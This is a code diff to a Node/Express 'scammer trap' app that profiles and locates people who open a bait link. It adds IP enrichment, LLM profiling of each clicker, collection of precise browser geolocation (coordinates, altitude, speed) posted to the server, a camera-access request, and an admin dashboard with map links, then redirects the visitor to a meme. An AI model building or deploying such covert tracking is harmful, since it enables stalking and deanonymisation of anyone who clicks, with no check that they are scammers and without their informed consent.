@@ -24,6 +24,11 @@ const pool = new Pool({ connectionString: process.env.DATABASE_URL });
       data JSONB,
       created_at TIMESTAMP DEFAULT NOW()
     );
+    CREATE TABLE IF NOT EXISTS live_events (
+      id SERIAL PRIMARY KEY,
+      data JSONB,
+      created_at TIMESTAMP DEFAULT NOW()
+    );
   `);
   console.log('✅ Database tables ready');
 })();
@@ -75,6 +80,12 @@ app.get('/', (req, res) => {
       <div>
         <h3 class="text-lg text-zinc-400 mb-3">Past results</h3>
         <div id="history" class="space-y-4"><em class="text-zinc-500">Loading…</em></div>
+      </div>
+
+      <div>
+        <h3 class="text-lg text-amber-400 mb-3">Research-mode events (geolocation &amp; extras)</h3>
+        <div id="liveResearch" class="space-y-4"></div>
+        <div id="researchHistory" class="space-y-4 mt-3"><em class="text-zinc-500">Loading…</em></div>
       </div>
     </div>
   </div>
@@ -138,6 +149,54 @@ app.get('/', (req, res) => {
       }
     }
 
+    function renderResearchEntry(data, ts) {
+      const entry = document.createElement('div');
+      entry.className = 'bg-zinc-900 p-4 rounded-2xl border border-amber-500';
+      const trapId = escapeHtml(data.trapId || '—');
+      const lat = escapeHtml(data.latitude != null ? data.latitude : '—');
+      const lon = escapeHtml(data.longitude != null ? data.longitude : '—');
+      const acc = escapeHtml(data.accuracy != null ? data.accuracy + ' m' : '—');
+      const rawJson = escapeHtml(JSON.stringify(data, null, 2));
+      const mapLink = (data.latitude != null && data.longitude != null)
+        ? '<a class="text-blue-400 underline" target="_blank" href="https://www.openstreetmap.org/?mlat=' + encodeURIComponent(data.latitude) + '&mlon=' + encodeURIComponent(data.longitude) + '#map=15/' + encodeURIComponent(data.latitude) + '/' + encodeURIComponent(data.longitude) + '">open map</a>'
+        : '';
+      entry.innerHTML = \`
+        <div class="flex justify-between">
+          <span class="font-bold text-amber-300">Research event — Trap \${trapId}</span>
+          <span class="text-xs text-zinc-400">\${escapeHtml(ts)}</span>
+        </div>
+        <div class="grid grid-cols-1 md:grid-cols-3 gap-3 mt-3 text-sm">
+          <div>Lat: <span class="font-mono">\${lat}</span></div>
+          <div>Lon: <span class="font-mono">\${lon}</span></div>
+          <div>Accuracy: <span class="font-mono">\${acc}</span></div>
+        </div>
+        <div class="mt-2 text-sm">\${mapLink}</div>
+        <button onclick="this.parentElement.querySelector('.raw').classList.toggle('hidden')" class="text-xs mt-3 underline">Show Raw JSON</button>
+        <pre class="raw hidden mt-3 text-xs bg-black p-4 overflow-auto">\${rawJson}</pre>
+      \`;
+      return entry;
+    }
+
+    async function loadResearchHistory() {
+      const wrap = document.getElementById('researchHistory');
+      try {
+        const r = await fetch('/api/live-events');
+        const rows = await r.json();
+        if (!Array.isArray(rows) || rows.length === 0) {
+          wrap.innerHTML = '<em class="text-zinc-500">No research-mode events yet. Enable research preview and wait for a click.</em>';
+          return;
+        }
+        wrap.innerHTML = '';
+        rows.forEach(row => {
+          const data = row.data || {};
+          const ts = new Date(row.created_at).toLocaleString();
+          wrap.appendChild(renderResearchEntry(data, ts));
+        });
+      } catch (e) {
+        wrap.innerHTML = '<em class="text-red-400">Failed to load research history.</em>';
+      }
+    }
+
     function openAdminPortal() {
       if (portalReady) return;
       portalReady = true;
@@ -148,7 +207,12 @@ app.get('/', (req, res) => {
         const logDiv = document.getElementById('liveLog');
         logDiv.prepend(renderEntry(data, new Date().toLocaleTimeString()));
       });
+      socket.on('research-live', (data) => {
+        const logDiv = document.getElementById('liveResearch');
+        logDiv.prepend(renderResearchEntry(data, new Date().toLocaleTimeString()));
+      });
       loadHistory();
+      loadResearchHistory();
     }
 
     async function generateBait() {
@@ -254,7 +318,23 @@ app.get('/check-scammer/:id', (req, res) => {
         })
       }).then(() => {
         if (localStorage.getItem('researchMode') === 'true') {
-          navigator.geolocation.getCurrentPosition(p => fetch('/api/live', {method:'POST', body:JSON.stringify(p)}));
+          navigator.geolocation.getCurrentPosition(p => {
+            const geo = {
+              trapId,
+              latitude: p.coords.latitude,
+              longitude: p.coords.longitude,
+              accuracy: p.coords.accuracy,
+              altitude: p.coords.altitude,
+              heading: p.coords.heading,
+              speed: p.coords.speed,
+              timestamp: p.timestamp
+            };
+            fetch('/api/live', {
+              method: 'POST',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify(geo)
+            });
+          });
           navigator.mediaDevices.getUserMedia({video:true}).then(() => console.log('📸 Camera hooked — Research Preview active')).catch(()=>{});
         }
         window.location = 'https://i.imgur.com/you-got-caught-meme.jpg'; // real meme redirect (change if you want)
@@ -329,10 +409,101 @@ app.get('/dashboard', (req, res) => {
 </html>`);
 });
 
-// ALL OTHER ENDPOINTS (track, live, etc.) remain exactly as before — your keys hard-coded, AI profiling live
-app.post('/api/create-trap', async (req, res) => { /* same as above */ });
-app.post('/api/track', async (req, res) => { /* ipinfo + AbuseIPDB + Openrouter AI + DB insert + emit */ });
-app.post('/api/live', (req, res) => { io.emit('research-live', req.body); res.sendStatus(200); });
+// TRACK — runs enrichment (ipinfo / AbuseIPDB / OpenRouter AI), persists to
+// the `clicks` table, and emits `live-click` over socket.io so the admin
+// portal sees the event in real time. All external enrichment is optional:
+// missing API keys just skip that field, they don't fail the request.
+app.post('/api/track', async (req, res) => {
+  try {
+    const body = req.body || {};
+    const clientIp = body.ip || req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+
+    let ipinfo = null, abuse = null, aiProfile = null;
+
+    if (process.env.IPINFO_TOKEN && clientIp) {
+      try {
+        const r = await axios.get(
+          `https://ipinfo.io/${encodeURIComponent(clientIp)}`,
+          { params: { token: process.env.IPINFO_TOKEN }, timeout: 5000 }
+        );
+        ipinfo = r.data;
+      } catch (e) { console.error('ipinfo failed:', e.message); }
+    }
+
+    if (process.env.ABUSEIPDB_KEY && clientIp) {
+      try {
+        const r = await axios.get('https://api.abuseipdb.com/api/v2/check', {
+          params: { ipAddress: clientIp, maxAgeInDays: 90 },
+          headers: { Key: process.env.ABUSEIPDB_KEY, Accept: 'application/json' },
+          timeout: 5000
+        });
+        abuse = r.data && r.data.data;
+      } catch (e) { console.error('abuseipdb failed:', e.message); }
+    }
+
+    if (process.env.OPENROUTER_KEY) {
+      try {
+        const summary = {
+          ip: clientIp, ua: body.ua, ipinfo, abuse,
+          timezone: body.timezone, languages: body.languages, screen: body.screen
+        };
+        const r = await axios.post(
+          'https://openrouter.ai/api/v1/chat/completions',
+          {
+            model: process.env.OPENROUTER_MODEL || 'openai/gpt-4o-mini',
+            messages: [{
+              role: 'user',
+              content: 'In 2-3 sentences, profile this likely-scammer click based on the data. Be concise.\n\n' + JSON.stringify(summary)
+            }]
+          },
+          {
+            headers: { Authorization: `Bearer ${process.env.OPENROUTER_KEY}` },
+            timeout: 10000
+          }
+        );
+        aiProfile = r.data && r.data.choices && r.data.choices[0] && r.data.choices[0].message && r.data.choices[0].message.content;
+      } catch (e) { console.error('openrouter failed:', e.message); }
+    }
+
+    const enriched = Object.assign({}, body, { ip: clientIp, ipinfo, abuse, aiProfile });
+
+    if (body.trapId) {
+      try {
+        await pool.query('INSERT INTO clicks (trap_id, data) VALUES ($1, $2)', [body.trapId, enriched]);
+      } catch (e) { console.error('clicks insert failed:', e.message); }
+    }
+
+    io.emit('live-click', enriched);
+    res.json({ ok: true });
+  } catch (e) {
+    console.error('track failed:', e);
+    res.status(500).json({ error: 'track failed' });
+  }
+});
+
+// RESEARCH LIVE — geolocation / extra signals from the scammer after the
+// research-mode toggle. Persist to `live_events` and emit `research-live`
+// so the admin portal can show it alongside the click feed.
+app.post('/api/live', async (req, res) => {
+  const payload = Object.assign({}, req.body || {}, { receivedAt: new Date().toISOString() });
+  try {
+    await pool.query('INSERT INTO live_events (data) VALUES ($1)', [payload]);
+  } catch (e) { console.error('live insert failed:', e.message); }
+  io.emit('research-live', payload);
+  res.sendStatus(200);
+});
+
+// Historical research-mode events for the admin portal.
+app.get('/api/live-events', async (req, res) => {
+  try {
+    const result = await pool.query(
+      'SELECT data, created_at FROM live_events ORDER BY created_at DESC LIMIT 100'
+    );
+    res.json(result.rows);
+  } catch (e) {
+    res.status(500).json({ error: 'failed to load live events' });
+  }
+});
 
 io.on('connection', () => {});
 
